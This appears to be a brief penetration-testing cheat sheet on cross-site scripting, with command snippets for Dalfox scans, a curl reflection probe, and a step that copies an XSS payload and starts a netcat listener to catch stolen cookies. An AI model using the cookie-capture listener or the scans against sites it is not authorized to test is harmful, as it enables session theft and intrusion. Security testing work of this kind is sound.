# Xss

## XSS some simple tricks

### XSS payload + listener

Copy a chosen XSS payload to clipboard and start a netcat listener for the cookie/data callback. Streamlines the paste-and-wait loop.

```sh title:"Copy XSS payload to clipboard, start nc listener"
echo '$xss_payloads' | xclip -sel clip && nc -lvnp $lport
```
<!-- cheat
import webserver
import tun_ip
import xss_quick_payloads
var port
var lport
-->

## scan

### Dalfox URL scan

Scan a URL with Dalfox.

```sh title:"Scan URL for XSS with Dalfox"
dalfox url "$url"
```
<!-- cheat
var url
-->

### Dalfox request scan

Scan a captured request with Dalfox.

```sh title:"Scan request for XSS with Dalfox"
dalfox file "$request_file"
```
<!-- cheat
var request_file
-->

### Reflected parameter probe

Send a controlled probe value to a parameter.

```sh title:"Send reflected XSS probe"
curl -sk "$url?$param=$probe"
```
<!-- cheat
var url
var param
var probe
-->
